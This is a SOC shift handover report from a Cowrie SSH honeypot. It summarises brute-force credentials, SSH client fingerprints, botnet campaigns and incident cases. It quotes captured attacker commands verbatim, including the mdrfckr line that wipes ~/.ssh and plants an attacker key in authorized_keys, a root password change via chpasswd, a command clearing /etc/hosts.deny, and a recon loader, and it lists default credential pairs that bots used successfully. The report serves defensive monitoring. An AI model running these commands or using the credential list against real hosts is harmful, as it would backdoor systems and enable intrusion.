# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-21 |
| **Generated At** | 2026-07-21T21:16:32Z |
| **Shift Time** | 21:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **166** |
| Confirmed Threats | **150** |
| False Positives Filtered | **16** (9.6%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **24** |
| High Severity Cases | **101** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **128** |
| Unique Credential Pairs | **73** |
| Unique Usernames | **18** |
| Unique Passwords | **62** |
| Successful Auth Pairs | **111** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 41 |
| `admin` | 22 |
| `support` | 11 |
| `config` | 7 |
| `supervisor` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `supervisor2023` | 6 |
| `2222222` | 5 |
| `webadmin` | 5 |
| `3333` | 4 |
| `LeitboGi0ro` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `supervisor` | `supervisor2023` | 6 |
| `centos` | `2222222` | 5 |
| `administrator` | `webadmin` | 5 |
| `root` | `LeitboGi0ro` | 4 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor` | `2.57.122.168` | 2026-07-21T18:58:39 |
| `config` | `3333` | `203.129.225.4` | 2026-07-21T19:00:08 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-21T19:01:36 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-21T19:01:36 |
| `config` | `3333` | `71.229.1.186` | 2026-07-21T19:03:18 |
| `config` | `3333` | `61.169.54.150` | 2026-07-21T19:03:30 |
| `donna` | `123donna` | `10.0.0.73` | 2026-07-21T19:04:16 |
| `donna` | `123donna` | `185.242.3.195` | 2026-07-21T19:05:39 |
| `config` | `ubuntu` | `180.188.253.150` | 2026-07-21T19:12:16 |
| `config` | `ubuntu` | `118.122.196.230` | 2026-07-21T19:12:30 |
| `support` | `support` | `176.53.159.196` | 2026-07-21T19:12:50 |
| `root` | `QAZ123456` | `185.242.3.195` | 2026-07-21T19:13:05 |
| `ubuntu` | `abcd1234` | `37.238.45.202` | 2026-07-21T19:13:54 |
| `ubuntu` | `abcd1234` | `156.238.86.2` | 2026-07-21T19:14:01 |
| `support` | `support` | `10.0.0.73` | 2026-07-21T19:14:11 |
| `admin` | `55` | `14.194.128.158` | 2026-07-21T19:15:24 |
| `admin` | `55` | `196.219.93.108` | 2026-07-21T19:15:36 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-07-21T19:17:10 |
| `ubuntu` | `abcd1234` | `10.0.0.73` | 2026-07-21T19:17:44 |
| `root` | `21` | `195.178.110.228` | 2026-07-21T19:18:59 |
| `root` | `321` | `195.178.110.228` | 2026-07-21T19:20:57 |
| `root` | `4321` | `195.178.110.228` | 2026-07-21T19:22:51 |
| `root` | `77` | `223.107.72.234` | 2026-07-21T19:24:25 |
| `root` | `54321` | `195.178.110.228` | 2026-07-21T19:24:38 |
| `root` | `P4ssw0rd` | `195.178.110.228` | 2026-07-21T19:26:22 |
| `root` | `77` | `60.223.245.120` | 2026-07-21T19:27:44 |
| `root` | `77` | `125.19.244.62` | 2026-07-21T19:27:53 |
| `root` | `P4ssword` | `195.178.110.228` | 2026-07-21T19:28:08 |
| `root` | `77` | `10.0.0.73` | 2026-07-21T19:28:14 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-07-21T19:30:01 |
| `root` | `Passw0rd` | `195.178.110.228` | 2026-07-21T19:31:47 |
| `root` | `letmein` | `195.178.110.228` | 2026-07-21T19:33:35 |
| `root` | `p4ssword` | `195.178.110.228` | 2026-07-21T19:35:14 |
| `supervisor` | `supervisor2023` | `111.171.125.94` | 2026-07-21T19:35:31 |
| `supervisor` | `supervisor2023` | `182.60.128.241` | 2026-07-21T19:35:40 |
| `airflow` | `airflow` | `134.122.125.41` | 2026-07-21T19:36:15 |
| `345gs5662d34` | `345gs5662d34` | `134.122.125.41` | 2026-07-21T19:36:17 |
| `airflow` | `3245gs5662d34` | `134.122.125.41` | 2026-07-21T19:36:17 |
| `root` | `p@ssw0rd` | `195.178.110.228` | 2026-07-21T19:37:10 |
| `default` | `default444` | `95.165.142.8` | 2026-07-21T19:38:14 |
| `supervisor` | `supervisor2023` | `210.245.95.11` | 2026-07-21T19:38:33 |
| `supervisor` | `supervisor2023` | `195.158.26.59` | 2026-07-21T19:38:42 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-07-21T19:38:59 |
| `supervisor` | `supervisor2023` | `10.0.0.73` | 2026-07-21T19:39:06 |
| `root` | `password` | `195.178.110.228` | 2026-07-21T19:40:47 |
| `default` | `default444` | `10.0.0.73` | 2026-07-21T19:42:08 |
| `root` | `qwerty` | `195.178.110.228` | 2026-07-21T19:42:28 |
| `admin` | `3333` | `10.0.0.73` | 2026-07-21T19:43:40 |
| `root` | `root1` | `195.178.110.228` | 2026-07-21T19:45:55 |
| `root` | `root12` | `195.178.110.228` | 2026-07-21T19:47:43 |
| `root` | `root123` | `195.178.110.228` | 2026-07-21T19:49:21 |
| `root` | `root2026` | `195.178.110.228` | 2026-07-21T19:50:56 |
| `mysql` | `qwerty12345` | `61.145.163.164` | 2026-07-21T19:52:08 |
| `root` | `welcome` | `195.178.110.228` | 2026-07-21T19:52:30 |
| `admin` | `123456` | `195.178.110.228` | 2026-07-21T19:54:04 |
| `admin` | `123qwe` | `195.178.110.228` | 2026-07-21T19:55:46 |
| `root` | `QAZ123456` | `10.0.0.73` | 2026-07-21T19:56:46 |
| `admin` | `123qwerty` | `195.178.110.228` | 2026-07-21T19:57:30 |
| `root` | `b` | `168.144.102.169` | 2026-07-21T19:58:20 |
| `345gs5662d34` | `345gs5662d34` | `168.144.102.169` | 2026-07-21T19:58:25 |
| `root` | `3245gs5662d34` | `168.144.102.169` | 2026-07-21T19:58:26 |
| `debian` | `debian2004` | `182.60.128.241` | 2026-07-21T19:58:29 |
| `debian` | `debian2004` | `65.20.233.110` | 2026-07-21T19:58:42 |
| `admin` | `21` | `195.178.110.228` | 2026-07-21T19:59:09 |
| `admin` | `321` | `195.178.110.228` | 2026-07-21T20:00:52 |
| `debian` | `debian2004` | `180.71.9.31` | 2026-07-21T20:01:57 |
| `admin` | `654321` | `195.178.110.228` | 2026-07-21T20:02:24 |
| `root` | `gaming` | `120.48.54.130` | 2026-07-21T20:02:40 |
| `test` | `7777777` | `211.23.109.116` | 2026-07-21T20:02:53 |
| `test` | `7777777` | `112.26.101.76` | 2026-07-21T20:03:03 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-07-21T20:03:55 |
| `support` | `2222` | `49.124.153.7` | 2026-07-21T20:04:21 |
| `admin` | `Password` | `195.178.110.228` | 2026-07-21T20:05:21 |
| `samuel` | `samuel` | `185.242.3.195` | 2026-07-21T20:05:23 |
| `test` | `7777777` | `107.135.117.245` | 2026-07-21T20:06:19 |
| `test` | `7777777` | `10.0.0.73` | 2026-07-21T20:06:40 |
| `admin` | `admin` | `195.178.110.228` | 2026-07-21T20:06:56 |
| `support` | `2222` | `196.203.231.220` | 2026-07-21T20:07:39 |
| `support` | `2222` | `93.177.157.179` | 2026-07-21T20:07:50 |
| `admin` | `admin12` | `195.178.110.228` | 2026-07-21T20:08:35 |
| `admin` | `admin123` | `195.178.110.228` | 2026-07-21T20:10:18 |
| `admin` | `admin2026` | `195.178.110.228` | 2026-07-21T20:11:58 |
| `centos` | `2222222` | `14.194.128.158` | 2026-07-21T20:13:01 |
| `centos` | `2222222` | `60.172.54.36` | 2026-07-21T20:13:15 |
| `admin` | `letmein` | `195.178.110.228` | 2026-07-21T20:13:40 |
| `admin` | `pa$w0rd` | `195.178.110.228` | 2026-07-21T20:15:16 |
| `centos` | `2222222` | `177.174.105.113` | 2026-07-21T20:16:33 |
| `centos` | `2222222` | `111.70.32.53` | 2026-07-21T20:16:42 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-07-21T20:16:44 |
| `centos` | `2222222` | `10.0.0.73` | 2026-07-21T20:16:59 |
| `admin` | `password` | `195.178.110.228` | 2026-07-21T20:18:12 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-07-21T20:19:47 |
| `support` | `support2023` | `220.128.137.164` | 2026-07-21T20:21:42 |
| `support` | `support2023` | `211.43.139.142` | 2026-07-21T20:21:55 |
| `support` | `support2023` | `10.0.0.73` | 2026-07-21T20:25:15 |
| `administrator` | `webadmin` | `60.175.91.53` | 2026-07-21T20:27:22 |
| `administrator` | `webadmin` | `41.224.62.206` | 2026-07-21T20:27:29 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-21T20:29:58 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-21T20:29:58 |
| `administrator` | `webadmin` | `182.75.227.178` | 2026-07-21T20:30:41 |
| `administrator` | `webadmin` | `10.0.0.73` | 2026-07-21T20:31:01 |
| `mysql` | `123abc` | `10.0.0.73` | 2026-07-21T20:32:19 |
| `oracle` | `121212` | `171.217.70.151` | 2026-07-21T20:40:54 |
| `oracle` | `121212` | `10.0.0.73` | 2026-07-21T20:41:17 |
| `admin` | `admin` | `94.154.43.60` | 2026-07-21T20:42:31 |
| `config` | `config2017` | `221.182.185.190` | 2026-07-21T20:44:58 |
| `config` | `config2017` | `203.75.170.63` | 2026-07-21T20:45:11 |
| `samuel` | `samuel` | `10.0.0.73` | 2026-07-21T20:48:27 |
| `root` | `V9vzNCil9W` | `124.221.136.114` | 2026-07-21T20:51:40 |
| `nobody` | `11` | `34.41.211.48` | 2026-07-21T20:51:47 |
| `nobody` | `11` | `211.253.10.61` | 2026-07-21T20:51:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **166** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 49 |
| OpenSSH | 44 |
| libssh | 13 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 44 | 42 |
| `2ec37a7cc8da...` | Mirai/variant | 40 | 2 |
| `f555226df196...` | Mirai/variant | 7 | 3 |
| `16443846184e...` | Generic scanner | 5 | 1 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 44 | 42 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 40 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 7 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `16443846184e...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 38 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:DhOW3VfkovL8"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.54.130`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `168.144.102.169`, `134.122.125.41`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **54** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS3462` | Data Communication Business Group | 4 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (101)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2d54b05eb138

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:58 |
| **Last Seen** | 2026-07-21 18:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:58:33` | `cowrie.session.connect` |
| `2026-07-21 18:58:34` | `cowrie.client.version` |
| `2026-07-21 18:58:34` | `cowrie.client.kex` |
| `2026-07-21 18:58:39` | `cowrie.login.success` |
| `2026-07-21 18:58:42` | `cowrie.session.params` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.success` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:42` | `cowrie.command.input` |
| `2026-07-21 18:58:43` | `cowrie.log.closed` |
| `2026-07-21 18:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6d285bc32b

| Field | Detail |
|---|---|
| **Source IP** | `203.129.225[.]4` |
| **First Seen** | 2026-07-21 19:00 |
| **Last Seen** | 2026-07-21 19:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:00:05` | `cowrie.session.connect` |
| `2026-07-21 19:00:06` | `cowrie.client.version` |
| `2026-07-21 19:00:06` | `cowrie.client.kex` |
| `2026-07-21 19:00:08` | `cowrie.login.success` |
| `2026-07-21 19:00:09` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.225[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.129.225[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4854b5c01c46

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 19:01 |
| **Last Seen** | 2026-07-21 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:01:35` | `cowrie.session.connect` |
| `2026-07-21 19:01:35` | `cowrie.client.version` |
| `2026-07-21 19:01:35` | `cowrie.client.kex` |
| `2026-07-21 19:01:36` | `cowrie.login.success` |
| `2026-07-21 19:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6227231793c4

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 19:01 |
| **Last Seen** | 2026-07-21 19:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:01:35` | `cowrie.session.connect` |
| `2026-07-21 19:01:35` | `cowrie.client.version` |
| `2026-07-21 19:01:35` | `cowrie.client.kex` |
| `2026-07-21 19:01:36` | `cowrie.login.success` |
| `2026-07-21 19:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4061c58d4beb

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 19:01 |
| **Last Seen** | 2026-07-21 19:03 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:01:41` | `cowrie.session.connect` |
| `2026-07-21 19:01:41` | `cowrie.client.version` |
| `2026-07-21 19:01:41` | `cowrie.client.kex` |
| `2026-07-21 19:01:42` | `cowrie.login.success` |
| `2026-07-21 19:01:43` | `cowrie.session.file_upload` |
| `2026-07-21 19:01:45` | `cowrie.session.params` |
| `2026-07-21 19:01:45` | `cowrie.command.input` |
| `2026-07-21 19:01:45` | `cowrie.command.input` |
| `2026-07-21 19:01:45` | `cowrie.command.input` |
| `2026-07-21 19:01:45` | `cowrie.command.failed` |
| `2026-07-21 19:01:45` | `cowrie.log.closed` |
| `2026-07-21 19:01:46` | `cowrie.session.params` |
| `2026-07-21 19:01:46` | `cowrie.command.input` |
| `2026-07-21 19:01:46` | `cowrie.log.closed` |
| `2026-07-21 19:01:47` | `cowrie.session.params` |
| `2026-07-21 19:01:47` | `cowrie.command.input` |
| `2026-07-21 19:01:47` | `cowrie.log.closed` |
| `2026-07-21 19:01:48` | `cowrie.session.params` |
| `2026-07-21 19:01:48` | `cowrie.command.input` |
| `2026-07-21 19:01:48` | `cowrie.command.failed` |
| `2026-07-21 19:01:48` | `cowrie.command.failed` |
| `2026-07-21 19:02:50` | `cowrie.session.params` |
| `2026-07-21 19:02:50` | `cowrie.command.input` |
| `2026-07-21 19:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5bdfbe0db73

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-07-21 19:03 |
| **Last Seen** | 2026-07-21 19:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:03:17` | `cowrie.session.connect` |
| `2026-07-21 19:03:17` | `cowrie.client.version` |
| `2026-07-21 19:03:17` | `cowrie.client.kex` |
| `2026-07-21 19:03:18` | `cowrie.login.success` |
| `2026-07-21 19:03:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae88176f112d

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-07-21 19:03 |
| **Last Seen** | 2026-07-21 19:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:03:28` | `cowrie.session.connect` |
| `2026-07-21 19:03:29` | `cowrie.client.version` |
| `2026-07-21 19:03:29` | `cowrie.client.kex` |
| `2026-07-21 19:03:30` | `cowrie.login.success` |
| `2026-07-21 19:03:31` | `cowrie.direct-tcpip.request` |
| `2026-07-21 19:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b06f3933661

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-21 19:03 |
| **Last Seen** | 2026-07-21 19:05 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:03:50` | `cowrie.session.connect` |
| `2026-07-21 19:03:50` | `cowrie.client.version` |
| `2026-07-21 19:03:50` | `cowrie.client.kex` |
| `2026-07-21 19:03:51` | `cowrie.login.success` |
| `2026-07-21 19:03:53` | `cowrie.session.file_upload` |
| `2026-07-21 19:03:54` | `cowrie.session.params` |
| `2026-07-21 19:03:54` | `cowrie.command.input` |
| `2026-07-21 19:03:54` | `cowrie.command.input` |
| `2026-07-21 19:03:54` | `cowrie.command.input` |
| `2026-07-21 19:03:54` | `cowrie.command.failed` |
| `2026-07-21 19:03:54` | `cowrie.log.closed` |
| `2026-07-21 19:03:55` | `cowrie.session.params` |
| `2026-07-21 19:03:55` | `cowrie.command.input` |
| `2026-07-21 19:03:55` | `cowrie.log.closed` |
| `2026-07-21 19:03:56` | `cowrie.session.params` |
| `2026-07-21 19:03:56` | `cowrie.command.input` |
| `2026-07-21 19:03:56` | `cowrie.log.closed` |
| `2026-07-21 19:03:58` | `cowrie.session.params` |
| `2026-07-21 19:03:58` | `cowrie.command.input` |
| `2026-07-21 19:03:58` | `cowrie.command.failed` |
| `2026-07-21 19:03:58` | `cowrie.command.failed` |
| `2026-07-21 19:04:59` | `cowrie.session.params` |
| `2026-07-21 19:04:59` | `cowrie.command.input` |
| `2026-07-21 19:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06ecc6046a0b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 19:05 |
| **Last Seen** | 2026-07-21 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 19:05:38` | `cowrie.session.connect` |
| `2026-07-21 19:05:38` | `cowrie.client.version` |
| `2026-07-21 19:05:39` | `cowrie.client.kex` |
| `2026-07-21 19:05:39` | `cowrie.login.success` |
| `2026-07-21 19:05:40` | `cowrie.session.params` |
| `2026-07-21 19:05:40` | `cowrie.command.input` |
| `2026-07-21 19:05:40` | `cowrie.log.closed` |
| `2026-07-21 19:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
